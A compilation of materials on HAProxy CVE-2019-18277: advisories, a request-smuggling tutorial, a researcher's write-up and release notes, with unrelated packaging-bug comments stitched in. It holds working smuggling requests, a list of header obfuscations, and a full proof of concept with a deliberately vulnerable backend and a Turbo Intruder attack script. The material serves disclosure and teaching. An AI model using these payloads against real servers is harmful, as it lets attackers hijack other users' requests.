# CVE-2019-18277

## Common Vulnerabilities and Exposures

[[Previous]](CVE-2019-18276.html) [[Index]](index.html) [[Next]](CVE-2019-18281.html)

### Upstream information

[CVE-2019-18277 at MITRE](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18277)

#### Description

A flaw was found in HAProxy before 2.0.6. In legacy mode, messages featuring a transfer-encoding header missing the "chunked" value were not being correctly rejected. The impact was limited but if combined with the "http-reuse always" setting, it could be used to help construct an HTTP request smuggling attack against a vulnerable component employing a lenient parser that would ignore the content-length header as soon as it saw a transfer-encoding one (even if not entirely valid according to the specification).

Package        : haproxy
Version        : 1.7.5-2+deb9u1
CVE ID         : CVE-2018-20102 CVE-2018-20103 CVE-2019-18277
Debian Bug     : 916308 916307

Nathan Davison discovered that HAProxy, a load balancing reverse proxy, did not
correctly reject requests or responses featuring a transfer-encoding header
missing the "chunked" value which could facilitate a HTTP request smuggling
attack. Furthermore several flaws were discovered in DNS related functions that
may trigger infinite recursion leading to a denial of service or to information
leakage due to a out-of-bounds read.

For Debian 9 stretch, these problems have been fixed in version
1.7.5-2+deb9u1.

We recommend that you upgrade your haproxy packages.

For the detailed security status of haproxy please refer to
its security tracker page at:
<https://security-tracker.debian.org/tracker/haproxy>

Further information about Debian LTS security advisories, how to apply
these updates to your system and frequently asked questions can be
found at: <https://wiki.debian.org/LTS>

| [Description](show_bug.cgi?id=1157714#c0)  Johannes Segitz   2019-11-25 15:33:56 UTC  ``` Created [attachment 824913](attachment.cgi?id=824913 "Upstream patches") [[details]](attachment.cgi?id=824913&action=edit "Upstream patches") Upstream patches  Extracted from a larger report:  Second, Christopher found from a bug report that we don't reject HEADERS frames on idle streams in H2 responses (which sadly are permitted by the H2 spec, and that I'm going to report separately). The effect there is that when trying to decode such a response we don't have any stream allocated since this transition should not be possible, and haproxy crashes. It's much less likely to be used to construct an attack, however it seems that some bogus servers mix up their stream IDs in response and can occasionally trigger the condition, as reported in issue #373.

# HTTP request smuggling

In this section, we'll explain HTTP request smuggling attacks and describe how common request smuggling vulnerabilities can arise.

#### Labs

If you're already familiar with HTTP request smuggling and just want to practice on a series of deliberately vulnerable sites, check out the link below for an overview of all labs in this topic.

## What is HTTP request smuggling?

HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from
one or more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain
unauthorized access to sensitive data, and directly compromise other application users.

Request smuggling is primarily associated with HTTP/1 requests. However, websites that support HTTP/2 may be vulnerable, depending on their back-end architecture.

#### PortSwigger Research

HTTP request smuggling was first documented in 2005, and repopularized by PortSwigger's extensive research on the topic. For details, check out the following whitepapers:

* [HTTP desync attacks: Request smuggling reborn](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
* [HTTP/2: The sequel is always worse](https://portswigger.net/research/http2)
* [Browser-powered desync attacks: A new frontier in HTTP request smuggling](https://portswigger.net/research/browser-powered-desync-attacks)
## What happens in an HTTP request smuggling attack?

Today's web applications frequently employ chains of HTTP servers between users and the ultimate application logic. Users send requests to
a front-end server (sometimes called a load balancer or reverse proxy) and this server forwards requests to one or more back-end servers.
This type of architecture is increasingly common, and in some cases unavoidable, in modern cloud-based applications.

When the front-end server forwards HTTP requests to a back-end server, it typically sends several requests over the same back-end network
connection, because this is much more efficient and performant. The protocol is very simple; HTTP requests are sent one after another, and
the receiving server has to determine where one request ends and the next one begins:

![Forwarding HTTP requests to a back-end server](/web-security/images/forwarding-http-requests-to-back-end-server.svg)

In this situation, it is crucial that the front-end and back-end systems agree about the boundaries between requests. Otherwise, an
attacker might be able to send an ambiguous request that gets interpreted differently by the front-end and back-end systems:

![Smuggling an HTTP request to a back-end server](/web-security/images/smuggling-http-request-to-back-end-server.svg)

Here, the attacker causes part of their front-end request to be interpreted by the back-end server as the start of the next request. It is
effectively prepended to the next request, and so can interfere with the way the application processes that request. This is a request
smuggling attack, and it can have devastating results.

## How do HTTP request smuggling vulnerabilities arise?

Most HTTP request smuggling vulnerabilities arise because the HTTP/1 specification provides two different ways to specify where a request
ends: the `Content-Length` header and the `Transfer-Encoding` header.

The `Content-Length` header is straightforward: it specifies the length of the message body in bytes. For
example:

`POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
q=smuggling`

The `Transfer-Encoding` header can be used to specify that the message body uses chunked encoding. This
means that the message body contains one or more chunks of data. Each chunk consists of the chunk size in bytes (expressed in
hexadecimal), followed by a newline, followed by the chunk contents. The message is terminated with a chunk of size zero. For example:

`POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
b
q=smuggling
0`
#### Note

Many security testers are unaware that chunked encoding can be used in HTTP requests, for two reasons:

* Burp Suite automatically unpacks chunked encoding to make messages easier to view and edit.
* Browsers do not normally use chunked encoding in requests, and it is normally seen only in server responses.

As the HTTP/1 specification provides two different methods for specifying the length of HTTP messages, it is possible for a single
message to use both methods at once, such that they conflict with each other. The specification attempts to prevent this problem by
stating that if both the `Content-Length` and `Transfer-Encoding` headers are
present, then the `Content-Length` header should be ignored. This might be sufficient to avoid ambiguity
when only a single server is in play, but not when two or more servers are chained together. In this situation, problems can arise for two
reasons:

* Some servers do not support the `Transfer-Encoding` header in requests.
* Some servers that do support the `Transfer-Encoding` header can be induced not to process it if the
  header is obfuscated in some way.

If the front-end and back-end servers behave differently in relation to the (possibly obfuscated) `Transfer-Encoding`
header, then they might disagree about the boundaries between successive requests, leading to request smuggling vulnerabilities.

#### Note

Websites that use HTTP/2 end-to-end are inherently immune to request smuggling attacks. As the HTTP/2 specification introduces a single, robust mechanism for specifying the length of a request, there is no way for an attacker to introduce the required ambiguity.

However, many websites have an HTTP/2-speaking front-end server, but deploy this in front of back-end infrastructure that only supports HTTP/1. This means that the front-end effectively has to translate the requests it receives into HTTP/1. This process is known as HTTP downgrading. For more information, see [Advanced request smuggling](/web-security/request-smuggling/advanced).

## How to perform an HTTP request smuggling attack

Classic request smuggling attacks involve placing both the `Content-Length` header and the `Transfer-Encoding`
header into a single HTTP/1 request and manipulating these so that the front-end and back-end servers process the request differently. The
exact way in which this is done depends on the behavior of the two servers:

* CL.TE: the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header.
* TE.CL: the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header.
* TE.TE: the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the
  servers can be induced not to process it by obfuscating the header in some way.

#### Note

These techniques are only possible using HTTP/1 requests. Browsers and other clients, including Burp, use HTTP/2 by default to communicate with servers that explicitly advertise support for it during the TLS handshake.

As a result, when testing sites with HTTP/2 support, you need to manually switch protocols in Burp Repeater. You can do this from the **Request attributes** section of the **Inspector** panel.

### CL.TE vulnerabilities

Here, the front-end server uses the `Content-Length` header and the back-end server uses the `Transfer-Encoding` header. We can perform a simple HTTP request smuggling attack as follows:

`POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked
0
SMUGGLED`

The front-end server processes the `Content-Length` header and determines that the request body is 13 bytes
long, up to the end of `SMUGGLED`. This request is forwarded on to the back-end server.

The back-end server processes the `Transfer-Encoding` header, and so treats the message body as using
chunked encoding. It processes the first chunk, which is stated to be zero length, and so is treated as terminating the request. The
following bytes, `SMUGGLED`, are left unprocessed, and the back-end server will treat these as being the
start of the next request in the sequence.

### TE.CL vulnerabilities

Here, the front-end server uses the `Transfer-Encoding` header and the back-end server uses the `Content-Length` header. We can perform a simple HTTP request smuggling attack as follows:

`POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked
8
SMUGGLED
0`
#### Note

To send this request using Burp Repeater, you will first need to go to the Repeater menu and ensure that the "Update Content-Length"
option is unchecked.

You need to include the trailing sequence `\r\n\r\n` following the final `0`.

The front-end server processes the `Transfer-Encoding` header, and so treats the message body as using
chunked encoding. It processes the first chunk, which is stated to be 8 bytes long, up to the start of the line following `SMUGGLED`. It processes the second chunk, which is stated to be zero length, and so is treated as terminating
the request. This request is forwarded on to the back-end server.

The back-end server processes the `Content-Length` header and determines that the request body is 3 bytes
long, up to the start of the line following `8`. The following bytes, starting with `SMUGGLED`, are left unprocessed, and the back-end server will treat these as being the start of the next
request in the sequence.

PRACTITIONER
[HTTP request smuggling, basic TE.CL vulnerability](/web-security/request-smuggling/lab-basic-te-cl)

### TE.TE behavior: obfuscating the TE header

Here, the front-end and back-end servers both support the `Transfer-Encoding` header, but one of the servers
can be induced not to process it by obfuscating the header in some way.

There are potentially endless ways to obfuscate the `Transfer-Encoding` header. For example:

`Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked`

Each of these techniques involves a subtle departure from the HTTP specification. Real-world code that implements a protocol specification
rarely adheres to it with absolute precision, and it is common for different implementations to tolerate different variations from the
specification. To uncover a TE.TE vulnerability, it is necessary to find some variation of the `Transfer-Encoding` header such that only one of the front-end or back-end servers processes it, while the
other server ignores it.

Depending on whether it is the front-end or the back-end server that can be induced not to process the obfuscated `Transfer-Encoding` header, the remainder of the attack will take the same form as for the CL.TE or TE.CL
vulnerabilities already described.

## Browser-powered request smuggling

The request smuggling techniques you've learned so far rely on sending intentionally malformed requests using dedicated hacking tools like Burp Repeater. In fact, it's possible to perform the same attacks using fully browser-compatible requests that desync the two servers using a perfectly normal `Content-Length` header.

This even enables you to launch client-side variations of these attacks, which induce a victim's browser to poison its own connection to the vulnerable website. Not only does this expose single-server sites to request smuggling-style attacks, it even enables you to attack sites that you don't have access to directly. Check out the learning materials and LABS to learn how.

## How to prevent HTTP request smuggling vulnerabilities

HTTP request smuggling vulnerabilities arise in situations where the front-end server and back-end server use different mechanisms for determining the boundaries between requests. This may be due to discrepancies between whether HTTP/1 servers use the `Content-Length` header or chunked transfer encoding to determine where each request ends. In HTTP/2 environments, the common practice of [downgrading HTTP/2 requests](/web-security/request-smuggling/advanced/http2-downgrading) for the back-end is also fraught with issues and enables or simplifies a number of additional attacks.

To prevent HTTP request smuggling vulnerabilities, we recommend the following high-level measures:

* Use HTTP/2 end to end and disable HTTP downgrading if possible. HTTP/2 uses a robust mechanism for determining the length of requests and, when used end to end, is inherently protected against request smuggling. If you can't avoid HTTP downgrading, make sure you validate the rewritten request against the HTTP/1.1 specification. For example, reject requests that contain newlines in the headers, colons in header names, and spaces in the request method.
* Make the front-end server normalize ambiguous requests and make the back-end server reject any that are still ambiguous, closing the TCP connection in the process.
* Never assume that requests won't have a body. This is the fundamental cause of both CL.0 and client-side desync vulnerabilities.
* Default to discarding the connection if server-level exceptions are triggered when handling requests.
* If you route traffic through a forward proxy, ensure that upstream HTTP/2 is enabled if possible.

As we've demonstrated in the learning materials, disabling reuse of back-end connections will help to mitigate certain kinds of attack, but this still doesn't protect you from [request tunnelling](/web-security/request-smuggling/advanced/request-tunnelling) attacks.

In legacy mode, messages featuring a transfer-encoding header missing the "chunked" value was not being correctly rejected. The impact was limited but if combined with "http-reuse always", it could be used as an help to construct a content smuggling attack against a vulnerable component employing a lenient parser which would ignore the content-length header as soon as it sees a transfer-encoding one, without even parsing it.

| [Description](show_bug.cgi?id=1082318#c0)  Fabian Vogt   2018-02-22 15:09:41 UTC  ``` Certain licenses require that license files must be shipped together with the binaries in all cases.  By using the %doc marker, this is no longer guaranteed (e.g. by enabling excludedocs).  Thus it is important that for such cases, %license is used instead of %doc. The effect is that the file is always installed, stored in a different directory (/usr/share/licenses/<pkg>/) and can be queried using rpm (e.g. "rpm -qL kernel-firmware"). ``` [Comment

Instead of breaking every single package by changing the meaning of "excludedocs" to mean "let me strip these files from the package", how about adding support for tagging files in an rpm as strippable or optional, so that not only documentation can be dropped when space is at a premium, but any other files that may not be essential for the functionality?  That way, every single package would still be OK even without any markup, and packages can be updated to mark files as optional over time.

I have no problem whatsoever with excludedocs meaning that files tagged as %doc are not installed.  I have a problem with excludedocs being used in a way that breaks the existing intention and usage of the %doc tag in spec files. Whoever thought that using excludedocs to strip packages for inclusion in containers was a good idea was evidently wrong about that, as it required the introduction of the %license tag, so that there are now two useless tags: Not only can %doc no longer be used to simply mark up documentation files as intended because it's being subverted to mean something it did not do before, but the only reason %license exists is as a hack to work around the previously mentioned hack. ``` [Comment 199](show_bug.cgi?id=1082318#c199)  Fabian Vogt   2019-09-18 12:13:54 UTC  ``` (In reply to Kristoffer Gronlund from [comment #198](show_bug.cgi?id=1082318#c198)) > (In reply to Fabian Vogt from [comment #197](show_bug.cgi?id=1082318#c197)) > > (In reply to Kristoffer Gronlund from [comment #196](show_bug.cgi?id=1082318#c196)) > > > Is it too late to object to this change, which is completely misguided? > > >  > > > Instead of breaking every single package by changing the meaning of > > > "excludedocs" to mean "let me strip these files from the package", how about > > > adding support for tagging files in an rpm as strippable or optional, so > > > that not only documentation can be dropped when space is at a premium, but > > > any other files that may not be essential for the functionality? > >  > > That's what optional subpackages are for though. > >  > > > That way, every single package would still be OK even without any markup, > > > and packages can be updated to mark files as optional over time.

This is the document I read:  <https://fedoraproject.org/wiki/Changes/Use_license_macro_in_RPMs_for_packages_in_Cloud_Image>  >Use new %license macro to separate license files from documentation, so the latter can be excluded from container images without stripping license information which must be included.

That's not the only reason for %license though, it also allows to query the individual license files of packages and to ensure that every package ships its license file. Without %license that is not possible. ``` [Comment 202](show_bug.cgi?id=1082318#c202)  Kristoffer Gronlund   2019-09-18 13:26:28 UTC  ``` (In reply to Fabian Vogt from [comment #201](show_bug.cgi?id=1082318#c201)) > (In reply to Kristoffer Gronlund from [comment #200](show_bug.cgi?id=1082318#c200)) > > (In reply to Fabian Vogt from [comment #199](show_bug.cgi?id=1082318#c199)) > > > (In reply to Kristoffer Gronlund from [comment #198](show_bug.cgi?id=1082318#c198)) > > > > (In reply to Fabian Vogt from [comment #197](show_bug.cgi?id=1082318#c197)) > > > > > (In reply to Kristoffer Gronlund from [comment #196](show_bug.cgi?id=1082318#c196)) > > > > > > Is it too late to object to this change, which is completely misguided? > > > > > >  > > > > > > Instead of breaking every single package by changing the meaning of > > > > > > "excludedocs" to mean "let me strip these files from the package", how about > > > > > > adding support for tagging files in an rpm as strippable or optional, so > > > > > > that not only documentation can be dropped when space is at a premium, but > > > > > > any other files that may not be essential for the functionality? > > > > >  > > > > > That's what optional subpackages are for though. > > > > >  > > > > > > That way, every single package would still be OK even without any markup, > > > > > > and packages can be updated to mark files as optional over time.

(at least, that is what it looks like to me). If the goal is to reduce the size of packages, I would prefer if that was done explicitly via directives introduced for that specific purpose.  But sure, I'll give this meaningless crusade up and concede that %license has a legitimate use on its own. ;) ``` [Comment 206](show_bug.cgi?id=1082318#c206)  Swamp Workflow Management   2019-10-02 16:11:55 UTC  ``` SUSE-SU-2019:2517-1: An update that solves one vulnerability and has two fixes is now available.

# HAProxy HTTP request smuggling (CVE-2019-18277)

## September 19, 2019

The following describes a technique to achieve [HTTP request smuggling](https://portswigger.net/web-security/request-smuggling) against infrastructure behind a HAProxy server when using specific configuration around backend connection reuse. This was tested against HAProxy versions 1.7.9, 1.7.11, 1.8.19, 1.8.21, 1.9.10, and 2.0.5. Of all these tested versions, only 2.0.5 was not vulnerable out of the box, although it is when using the `no option http-use-htx` configuration, which reverts back to the legacy HTTP decoder. 2.1 removed the legacy decoder so it is not affected.

To actually exploit HTTP smuggling using the issue described in this writeup, the backend server(s) behind HAProxy would also have to be vulnerable in the sense they too would need to suffer from a bug, but one which parses and accepts a poorly formed Transfer-Encoding header (almost certainly violating RFC7230). The backend must also support HTTP keep-alive.

## The HAProxy bug - sending both Transfer-Encoding and Content-Length

This is how HAProxy handles a request when Transfer-Encoding and Content-Length is provided together:

**Request to HAProxy:**

```
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

**Request forwarded to backend:**

```
POST / HTTP/1.1
Host: 127.0.0.1:1080
Transfer-Encoding: chunked
X-Forwarded-For: 172.21.0.1

0

```

The request HAProxy sends to the backend has correctly prioritized Transfer-Encoding, and has stripped out the content length and cut off the "X" from the request, which went outside the boundry of the Transfer-Encoding request.

However, in the next request we have a `\x0b` (vertical tab) before the "chunked" string (note: `\x0c` aka form feed also works).

**Request to HAProxy:**

```
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding:[\x0b]chunked

0

X
```

**Request forwarded to backend:**

```
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 6
Transfer-Encoding:
                  chunked
X-Forwarded-For: 172.21.0.1

0

X
```

In this case, the Transfer-Encoding is not detected by HAProxy, and so the Content-Length is used (and as such, the `X` is forwarded because it falls within the 6 bytes of body size specified). However, because the Transfer-Encoding header remains in the request sent to the backend, it means that if a backend server manages to parse the Transfer-Encoding header and proceeds to treat the request as a TE encoded request, a desync could occur and the backend TCP socket could be poisoned (in this case, with an "X"). This could then lead to HTTP request smuggling if the connection is being reused for other requests. So it can be said that this HAProxy bug is toothless without a buggy backend, but the backend's bug wouldn't amount to smuggling without the help of the HAProxy bug, if it's sitting behind HAProxy.

A way to test whether smuggling may be possible against an app behind HAProxy would be to issue a request like as outlined in the [HTTP Request Smuggling Reborn](https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn) research, but with the `\x0b` or `\x0c` character (which will likely render below as a smaller than usual space between header name and value):

```
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 4
Transfer-Encoding:chunked

1
Z
Q
```

Because it uses the Content-Length when we have this character in the Transfer-Encoding value, HAProxy will forward the following to the backend:

```
POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 4
Transfer-Encoding:
                  chunked
X-Forwarded-For: 172.21.0.1

1
Z
```

If the backend parses this request using Transfer-Encoding, then it will timeout waiting for the terminating '0\r\n\r\n'. The aforementioned research classifies it as "CL.TE" desync (correction: this actually appears to be more of a "TE.TE" desync, as the HAProxy frontend will parse TE if it is present, it just doesn't in this specific case when abusing this bug).

## Request smuggling proof of concept

Now we have HAProxy sending through both Content-Length and Transfer-Encoding with potentially conflicting information, we can try to achieve request smuggling. This can be demonstrated using the following setup.

### HAProxy config

Use this `haproxy.cfg`:

```
defaults
    mode http
    timeout http-keep-alive 10s
    timeout connect 5s
    timeout server 60s
    timeout client 30s
    timeout http-request 30s

backend web
    http-reuse always
    server web0 host.docker.internal:6767

frontend http
    bind *:1080
    timeout client 5s
    timeout http-request 10s
    default_backend web
```

You may need to change `host.docker.internal` to point to the actual backend app (code below), as this currently assumes HAProxy is running in a docker container and the docker host is running the backend server.

The real key here is `http-reuse always`, which is not the default option for handling connection reuse in HAProxy. See more detail about this setting here: <http://cbonte.github.io/haproxy-dconv/1.9/configuration.html#4.2-http-reuse>. This is essential to achieve request smuggling, as we want our victim connections from HAProxy to the backend server to reuse our attacker controlled connection.

### The backend

For the backend, we need a HTTP server which will go along with the HAProxy keep-alives, and which will parse the malformed Transfer-Encoding header as valid, and also prioritize the Transfer-Encoding over Content-Length. This could describe many backend servers, but one I've found is the Python gunicorn app server (tested against the current latest 19.9.0) when combined with any of the workers except sync (doesn't support keep-alive) and tornado. Below I have a demo web app using Flask that should be vulnerable to request smuggling when combined with the HAProxy bug. First let's install the prereqs:

```
pip install flask
pip install gunicorn
pip install gunicorn[gevent]
```

And the app `backend.py`:

```
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def main():
    # the next line is required for Transfer-Encoding support in the request
    request.environ['wsgi.input_terminated'] = True
    headers = {}
    for header in request.headers:
        headers[header[0]] = header[1]
    return jsonify(body=request.data, headers=headers)
```

gunicorn is used to serve the application, and we need to specify a non default worker to enable keep-alive:

```
gunicorn --keep-alive 10 -k gevent --bind 0.0.0.0:6767 -w 4 backend:app
```

Now with HAProxy running the above config and our backend server running, we should be able to test it for smuggling. The best way to do this from my experience is using Burp Suite's Turbo Intruder extension with the following script:

```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='http://127.0.0.1:1080',
                           concurrentConnections=1,
                           requestsPerConnection=1,
                           pipeline=False,
                           maxRetriesPerRequest=0
                           )

    attack = '''POST / HTTP/1.1
Host: 127.0.0.1:1080
Content-Length: 37
Connection: keep-alive
Transfer-Encoding:chunked

1
A
0

GET / HTTP/1.1
X-Foo: bar'''
    engine.queue(attack)
    engine.start()

def handleResponse(req, interesting):
    table.add(req)
    if req.code == 200:
        victim = '''GET / HTTP/1.1
Host: 127.0.0.1:1080
Connection: close

'''

        for i in range(10):
            req.engine.queue(victim)
```

Note the `concurrentConnections=1` and `requestsPerConnection=1` configuration in this script - this should avoid encountering false positives, where we are poisoning our client to HAProxy connection instead of HAProxy to backend. You may need to change the endpoint and Host headers to suit your environment.

How do we know we have achieved smuggling? when we launch this attack in Turbo Intruder, one of the victim results (likely the first) should stand out response size wise. Going back to the above app code, we are echoing out the request headers in the response. Here is what the response for the poisoned victim request looks like:

```
{"body":"","headers":{"Host":"127.0.0.1:1080","X-Foo":"barGET / HTTP/1.1"}}
```

We can see here that the `X-Foo: bar` header in the attacker request is present in a victim request's headers, and the `GET / HTTP/1.1` that the victim really wanted to request has been appended to this. This is a smuggled header, achieving HTTP request smuggling.

## Fix

The HAProxy bug which allows the malformed Transfer-Encoding header through was [fixed in 2.0.6](https://www.mail-archive.com/haproxy%40formilux.org/msg34926.html) for those on 2.0.x who need the `no option http-use-htx` config. In 1.9, you should be able to use `option http-use-htx` to switch to the new HTTP decoder which is enabled by default in 2.0, which is not vulnerable to this bug. For those on 1.9 who need to use the legacy decoder or on earlier versions, the commit message <https://git.haproxy.org/?p=haproxy-2.0.git;a=commit;h=196a7df44d8129d1adc795da020b722614d6a581> suggests it will be back ported to all maintained versions (which appears to be 1.6 and above at the time or writing).

As `http-reuse always` is needed to demonstrate smuggling, it may also be worth reconsidering this HAProxy configuration if you have it.

## Reporting timeline

* Reported the malformed Transfer-Encoding bug to HAProxy maintainers on September 7th 2019.
* Fixed in [HAProxy 2.0.6 on September 13th 2019](https://www.mail-archive.com/haproxy%40formilux.org/msg34926.html)
* CVE-2019-18277 assigned on 23/10/2019.

## Thanks

A big thanks to [James Kettle](https://twitter.com/albinowax) for the advice, and particularly for the tip on the Turbo Intruder script and needing `requestsPerConnection=1` to avoid false positives with smuggling. Also, thanks to the HAProxy maintainers for their responsiveness and advice to help further understand the issue.

# [[ANNOUNCE] haproxy-2.0.6](/search?l=haproxy@formilux.org&q=subject:%22%5C%5BANNOUNCE%5C%5D+haproxy%5C-2.0.6%22&o=newest)

```
Hi,

HAProxy 2.0.6 was released on 2019/09/13. It added 36 new commits
after version 2.0.5.
```
```

A major issue was fixed in the SSL part. When a SSL socket was created, its
context was not fully initialized. Because this context is allocated from a
memory pool, it was possible to inherit some information from a previous
session. Thus, some fetches, related to client's certificate presence or its
verify status and errors, was returning erroneous values. So SSL connections
without client certificate were able to be accepted by HAProxy from the time a
previous one was already accepted with a valid client certificate. This issue
was reported on GitHub (#248).

An AB/BA locking issue was fixed about the listeners. The functions
protocol_enable_all() and delete_listener() were using the same locks in a
reverse order. The former being used during startup and the latter during stop,
it was possible to have a deadlock during reload floods. Note though, it is
pretty hard to hit this issue in 2.0 and above.

Nathan Davison (@ndavison) reported that in legacy mode we didn't correctly
rejected messages featuring a transfer-encoding header missing the "chunked"
value. The impact was limited, but if combined with "http-reuse always", it
could be used as an help to construct a content smuggling attack against a
vulnerable component employing a lenient parser which would ignore the
content-length header as soon as it sees a transfer-encoding one, without even
parsing it.

An improvement was made on the idle connections management. Now, we don't keep
more idle connections than we've ever had outstanding requests on a server. This
way the total number of idle connections will never exceed the sum of maximum
connections. Thus highly loaded servers will be able to get many connections and
slightly loaded servers will keep less. This address performance issues with the
option "http-reuse safe" (the default) because of too many idle connections kept
opened and never reused.

An old bug on legacy HTTP analyzers was fixed. When HAProxy was waiting for a
request or a response, the parsing was delayed if the buffer appeared as not
rewritable (reserve not fully free), without any other criteria. It might
blocked
the message analysis for a while, sometime infinitely depending on
circumstances. For instance, It was happening when the cache applet used the
reserve to added the header "Age" on cached responses. This test was based an
old
implicit assumption that stated if a buffer was not rewritable, it meant some
outgoing data were pending to be sent. On recent versions, this is not true
anymore because all outgoing data are sent before starting the analysis of the
next transaction.

Several bugs was fixed into the H1 multiplexer. The trailers of chunked messages
were sometimes truncated on buffer boundary because the parser systematically
reported an error when the buffer was full during trailers parsing. Now, an
error is only reported if the buffer is full because trailers are too huge. In
the same spirit, errors might be reported on transfers ending if the buffer was
full because no more space left to add the EOM block. SD termination state was
erroneously reported in HAProxy logs for successful transfers.

Two bugs was fixed on the cache. Both concerned the way messages with a huge
header part were handled by the cache. First, messages with an header part
impinging upon the buffer's reserved were stored in the cache. Now these
messages are not cached anymore. The reserve must remain available to handle
the response processing when a cached object is served, just like any other
response. Then, in the cache, messages with an header part stored on several
shctx blocks (> 1024 bytes) were not correctly served.

Finally, the usual bunch of bug fixes here and there. Some improvements were
made on checks to adapt them to recent changes on the connections layer. The
sample fetch url32 was fixed to really take the path part into account. A memory
leak during configuration parsing was fixed, when an ACL expression was
parsed. Response flags are now correctly reset when 1xx messages are handled so
it is possible to compress HTTP responses preceded by a 100-Continue. The server
weights are now ignored for empty servers to not always pick the same server on
low load (thanks to @malsumis and @jaroslawr for this fix). And so on.

It is also noticeable that Luca Schimweg added the sample fetch uuid() to get an
UUID following the format of version 4 in the RFC4122 standard. The
DRAIN/MAINT/NOLB status are now reported for servers by the Prometheus
exporter. And
the number of idle connections for each server is now reported on the stats page
likewise the configuration limit.

All users of the 2.0 are encouraged to upgrade, especially those using
authentication with SSL client certificate.
